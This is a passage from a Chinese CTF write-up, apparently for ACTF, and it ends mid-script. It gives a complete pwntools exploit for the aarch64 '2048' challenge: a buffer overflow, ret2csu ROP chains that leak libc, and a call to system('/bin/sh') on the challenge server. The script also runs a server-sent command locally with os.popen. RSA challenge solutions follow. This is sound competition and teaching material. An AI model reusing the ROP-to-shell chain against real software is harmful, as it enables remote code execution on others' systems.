</span></span></code></pre></td></tr></table></div></div><p>我的idb文件</p><p>暂时无法在文档外展示此内容</p><p>VM指令的文本格式，运行上面的脚本应该可以得到相同的数据，ID：Cynosure 对指令有问题可以找我~~(或许我写错了，呜呜呜)~~</p><p>文本比较大，有4w+行指令</p><p>暂时无法在文档外展示此内容</p><h2 id=2048>2048</h2><p>过了2048后直接ret2csu。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=n>choices</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#0x402068 main ret</span>
</span></span><span class=line><span class=cl><span class=n>system_py</span> <span class=o>=</span> <span class=mh>0x40568</span>
</span></span><span class=line><span class=cl><span class=n>puts_py</span> <span class=o>=</span> <span class=mh>0x658c8</span>
</span></span><span class=line><span class=cl><span class=n>puts_plt</span> <span class=o>=</span> <span class=mh>0x400760</span>
</span></span><span class=line><span class=cl><span class=n>puts_got</span> <span class=o>=</span> <span class=mh>0x412F88</span>
</span></span><span class=line><span class=cl><span class=n>main_addr</span> <span class=o>=</span> <span class=mh>0x401EB0</span>
</span></span><span class=line><span class=cl><span class=n>name_addr</span> <span class=o>=</span> <span class=mh>0x413154</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>p3_p64</span><span class=p>(</span><span class=n>i</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p64</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;iso-8859-1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_ret2csu</span><span class=p>(</span><span class=n>func</span><span class=p>,</span> <span class=n>arg1</span><span class=p>,</span> <span class=n>arg2</span><span class=p>,</span> <span class=n>arg3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>x30</span> <span class=o>=</span> <span class=mh>0x4020B8</span>
</span></span><span class=line><span class=cl>    <span class=c1>#0x4020B8: LDR             X3, [X21,X19,LSL#3]</span>
</span></span><span class=line><span class=cl>    <span class=n>x19</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>x20</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>x24</span> <span class=o>=</span> <span class=n>arg1</span>
</span></span><span class=line><span class=cl>    <span class=n>x23</span> <span class=o>=</span> <span class=n>arg2</span>
</span></span><span class=line><span class=cl>    <span class=n>x22</span> <span class=o>=</span> <span class=n>arg3</span>
</span></span><span class=line><span class=cl>    <span class=n>x21</span> <span class=o>=</span> <span class=n>func</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>p3_p64</span><span class=p>(</span><span class=mh>0x4020D8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#0x4020D8: LDP             X19, X20, [SP,#0x10]</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p3_p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># useless</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p3_p64</span><span class=p>(</span><span class=n>x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p3_p64</span><span class=p>(</span><span class=n>x19</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p3_p64</span><span class=p>(</span><span class=n>x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p3_p64</span><span class=p>(</span><span class=n>x21</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p3_p64</span><span class=p>(</span><span class=n>x24</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p3_p64</span><span class=p>(</span><span class=n>x23</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p3_p64</span><span class=p>(</span><span class=n>x22</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># r = process([&#34;qemu-aarch64&#34;, &#34;-g&#34;, &#34;1234&#34;, &#34;./2048&#34;])</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;124.70.166.38&#34;</span><span class=p>,</span> <span class=s2>&#34;9999&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;`&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;`&#34;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;iso-8859-1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>token</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>token</span> <span class=o>=</span> <span class=n>token</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>token</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input your name: </span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>p3_p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p3_p64</span><span class=p>(</span><span class=n>puts_plt</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;asasasasasasassasasasasasasaasasasasasasassasasasasasasadadasaasasassadsassssassadsasassassdasdadadadssasasaaadsaasasdsasdsaasdadassasasdssdsasasaaadassdsaasaadsaasssasdsaassassdsasassadsasdsasasdsssdsassassaasasdasasasadsaaadasadssssasadsasasaasasdsaassaasaaasasaaaaaaadasssdaasaaaadsasdsssadsssasadsaadsaadsdsasadassaasdssadsaasasasaasasadadsasasaassaasadsasaasasadsasadasaasasasasaadadadsasdssasdsdsssdsdaaasdsdsddssasassssdasssassaadasasasadasasassdsasssasssasssssdsssssssasadssdsdsasdsassaasaassddsaasasasasssdsassasdaassdassdssaasasssdsdssadassdassdasasadadasasdasdsasaadasdsassasdsadadssasdssssdassdsdsadsssassasssdsasassaassdsasdsadssasssdsaassadsasaasdssasdsssasasdsdsdsdaddsddddddasdssasssdasdsssadasasassaaasaaaassasaadssdsdsddadsdsaasdassasasdadsasddsasasdsddsssasdsdsdsssdsasassdsdssdsdsdsdsdddadsdasdsdsdsdsssdssdsddsdadadsdssddsdadasdssdddsasssdadssadssssdadsdssdssdsddssddsdsasdsdasdsasddsdssddsdasddsasassddsdsdsaasddsadsdssdsassasassdsdassasddssssadsdsdssddsdddddadsdsdsaaa&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=mh>0x28</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>func_ret2csu</span><span class=p>(</span><span class=n>name_addr</span> <span class=o>+</span> <span class=mi>8</span><span class=p>,</span> <span class=n>puts_got</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>func_ret2csu</span><span class=p>(</span><span class=n>name_addr</span> <span class=o>+</span> <span class=mi>8</span><span class=p>,</span> <span class=n>puts_got</span> <span class=o>+</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>8</span><span class=p>:]</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Do you want to continue playing? [y/n]: &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x658c8</span> <span class=o>-</span> <span class=mh>0xa000000</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>+=</span> <span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;libc: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input your name: </span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=n>p3_p64</span><span class=p>(</span><span class=n>libc</span> <span class=o>+</span> <span class=n>system_py</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;asasasasasasassasasasasasasaasasasasasasassasasasasasasadadasaasasassadsassssassadsasassassdasdadadadssasasaaadsaasasdsasdsaasdadassasasdssdsasasaaadassdsaasaadsaasssasdsaassassdsasassadsasdsasasdsssdsassassaasasdasasasadsaaadasadssssasadsasasaasasdsaassaasaaasasaaaaaaadasssdaasaaaadsasdsssadsssasadsaadsaadsdsasadassaasdssadsaasasasaasasadadsasasaassaasadsasaasasadsasadasaasasasasaadadadsasdssasdsdsssdsdaaasdsdsddssasassssdasssassaadasasasadasasassdsasssasssasssssdsssssssasadssdsdsasdsassaasaassddsaasasasasssdsassasdaassdassdssaasasssdsdssadassdassdasasadadasasdasdsasaadasdsassasdsadadssasdssssdassdsdsadsssassasssdsasassaassdsasdsadssasssdsaassadsasaasdssasdsssasasdsdsdsdaddsddddddasdssasssdasdsssadasasassaaasaaaassasaadssdsdsddadsdsaasdassasasdadsasddsasasdsddsssasdsdsdsssdsasassdsdssdsdsdsdsdddadsdasdsdsdsdsssdssdsddsdadadsdssddsdadasdssdddsasssdadssadssssdadsdssdssdsddssddsdsasdsdasdsasddsdssddsdasddsasassddsdsdsaasddsadsdssdsassasassdsdassasddssssadsdsdssddsdddddadsdsdsaaa&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=mh>0x28</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>func_ret2csu</span><span class=p>(</span><span class=n>name_addr</span> <span class=o>+</span> <span class=mi>8</span><span class=p>,</span> <span class=n>name_addr</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Do you want to continue playing? [y/n]: &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=crypto>Crypto</h1><h2 id=impossible-rsa>impossible RSA</h2><p>给了ssl格式的公钥，先去在线网站解出n、e。</p><p>根据题目条件可推导出这样的关系：</p><p>$$k \cdot p^2 + p - e \cdot n = 0$$</p><p>这里直接用求根判别公式去爆破k即可。exp：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gmpy2</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=mi>65537</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>15987576139341888788648863000534417640300610310400667285095951525208145689364599119023071414036901060746667790322978452082156680245315967027826237720608915093109552001033660867808508307569531484090109429319369422352192782126107818889717133951923616077943884651989622345435505428708807799081267551724239052569147921746342232280621533501263115148844736900422712305937266228809533549134349607212400851092005281865296850991469375578815615235030857047620950536534729591359236290249610371406300791107442098796128895918697534590865459421439398361818591924211607651747970679849262467894774012617335352887745475509155575074809</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>100000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>l</span> <span class=o>=</span> <span class=n>iroot</span><span class=p>(</span><span class=mi>1</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>i</span> <span class=o>*</span> <span class=n>e</span> <span class=o>*</span> <span class=n>n</span><span class=p>,</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>l</span><span class=p>[</span><span class=mi>1</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>n</span><span class=o>%</span><span class=p>((</span><span class=n>l</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=o>//</span> <span class=p>(</span><span class=mi>2</span><span class=o>*</span><span class=n>i</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span> <span class=o>=</span> <span class=p>(</span><span class=n>l</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=o>//</span> <span class=p>(</span><span class=mi>2</span><span class=o>*</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>q</span> <span class=o>=</span> <span class=n>n</span><span class=o>//</span><span class=n>p</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>p</span><span class=o>*</span><span class=n>q</span> <span class=o>==</span> <span class=n>n</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=n>invert</span><span class=p>(</span><span class=n>e</span><span class=p>,(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=n>q</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>f</span><span class=p>,</span><span class=n>d</span><span class=p>,</span><span class=n>n</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=c1># b&#39;ACTF{F1nD1nG_5pEcia1_n_i5_nOt_eA5y}&#39;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=rsa-leak>RSA LEAK</h2><p>这题一共有两个难点：1.类似于中间相遇的攻击思想求rp和rq 2.用已知条件建立一元二次方程求根</p><p>首先根据leak函数来求rp和rq，由于这两者都是（0，2^24）的随机数，双层循环爆破很困难，于是采用中间相遇的思想——以空间换时间：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># 中间相遇攻击</span>
</span></span><span class=line><span class=cl><span class=n>dic</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=o>**</span><span class=mi>24</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>=</span><span class=p>(</span><span class=n>out</span><span class=o>-</span><span class=nb>pow</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>e</span><span class=p>,</span><span class=n>n0</span><span class=p>))</span><span class=o>%</span><span class=n>n0</span>
</span></span><span class=line><span class=cl>    <span class=n>dic</span><span class=p>[</span><span class=n>tmp</span><span class=p>]</span><span class=o>=</span><span class=n>i</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>24</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>e</span><span class=p>,</span><span class=n>n0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>t</span> <span class=ow>in</span> <span class=n>dic</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>dic</span><span class=p>[</span><span class=n>t</span><span class=p>])</span>
</span></span></code></pre></td></tr></table></div></div><p>对于n=pp.qq，不难发现a.b就等于n开四次根取整，因为这里的rp和rq太小了。整理一下所有的已知条件：
$$
\begin{aligned}
r_p &= pp - p \
r_q &= qq - q \
pq &= (ab)^4 \
pp \cdot qq &= n
\end{aligned}
$$
如果我们用rp乘rq，会出现n,pp<em>q,qq</em>p,p<em>q ，由于 pp</em>q 是未知的，所以需要构造这个来相消；因此考虑 rp<em>q ，同理rq</em>p，消去以后剩下 p*q 和 n ，都是已知量，最后得到：</p><p>$$r_p \cdot q^2 + (pq - r_p \cdot r_q - p^2 q^2) + r_q \cdot p^2 = 0$$</p><p>等式两边同乘qq得到关于qq的一元二次方程，解出来就是qq，完整过程：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gmpy2</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tqdm</span> <span class=kn>import</span> <span class=n>tqdm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>n0</span> <span class=o>=</span> <span class=mi>122146249659110799196678177080657779971</span>
</span></span><span class=line><span class=cl><span class=n>out</span> <span class=o>=</span> <span class=p>(</span><span class=mi>90846368443479079691227824315092288065</span><span class=o>-</span><span class=mh>0xdeadbeef</span><span class=p>)</span><span class=o>%</span><span class=n>n0</span>
</span></span><span class=line><span class=cl><span class=n>sig</span> <span class=o>=</span> <span class=mh>0xdeadbeef</span>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=mi>65537</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 中间相遇攻击</span>
</span></span><span class=line><span class=cl><span class=n>dic</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=o>**</span><span class=mi>24</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>=</span><span class=p>(</span><span class=n>out</span><span class=o>-</span><span class=nb>pow</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>e</span><span class=p>,</span><span class=n>n0</span><span class=p>))</span><span class=o>%</span><span class=n>n0</span>
</span></span><span class=line><span class=cl>    <span class=n>dic</span><span class=p>[</span><span class=n>tmp</span><span class=p>]</span><span class=o>=</span><span class=n>i</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>24</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>e</span><span class=p>,</span><span class=n>n0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>t</span> <span class=ow>in</span> <span class=n>dic</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>dic</span><span class=p>[</span><span class=n>t</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># sage</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
</span></span><span class=line><span class=cl><span class=n>r1</span><span class=o>=</span><span class=mi>11974933</span>
</span></span><span class=line><span class=cl><span class=n>r2</span><span class=o>=</span><span class=mi>405771</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>3183573836769699313763043722513486503160533089470716348487649113450828830224151824106050562868640291712433283679799855890306945562430572137128269318944453041825476154913676849658599642113896525291798525533722805116041675462675732995881671359593602584751304602244415149859346875340361740775463623467503186824385780851920136368593725535779854726168687179051303851797111239451264183276544616736820298054063232641359775128753071340474714720534858295660426278356630743758247422916519687362426114443660989774519751234591819547129288719863041972824405872212208118093577184659446552017086531002340663509215501866212294702743</span>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=mi>65537</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=mi>48433948078708266558408900822131846839473472350405274958254566291017137879542806238459456400958349315245447486509633749276746053786868315163583443030289607980449076267295483248068122553237802668045588106193692102901936355277693449867608379899254200590252441986645643511838233803828204450622023993363140246583650322952060860867801081687288233255776380790653361695125971596448862744165007007840033270102756536056501059098523990991260352123691349393725158028931174218091973919457078350257978338294099849690514328273829474324145569140386584429042884336459789499705672633475010234403132893629856284982320249119974872840</span>
</span></span><span class=line><span class=cl><span class=n>t</span><span class=o>=</span><span class=n>gmpy2</span><span class=o>.</span><span class=n>iroot</span><span class=p>(</span><span class=n>n</span><span class=p>,</span><span class=mi>4</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span><span class=o>^</span><span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=n>A</span><span class=o>=</span><span class=n>r1</span>
</span></span><span class=line><span class=cl><span class=n>B</span><span class=o>=</span><span class=n>t</span><span class=o>-</span><span class=n>r1</span><span class=o>*</span><span class=n>r2</span><span class=o>-</span><span class=n>n</span>
</span></span><span class=line><span class=cl><span class=n>C</span><span class=o>=</span><span class=n>r2</span><span class=o>*</span><span class=n>n</span>
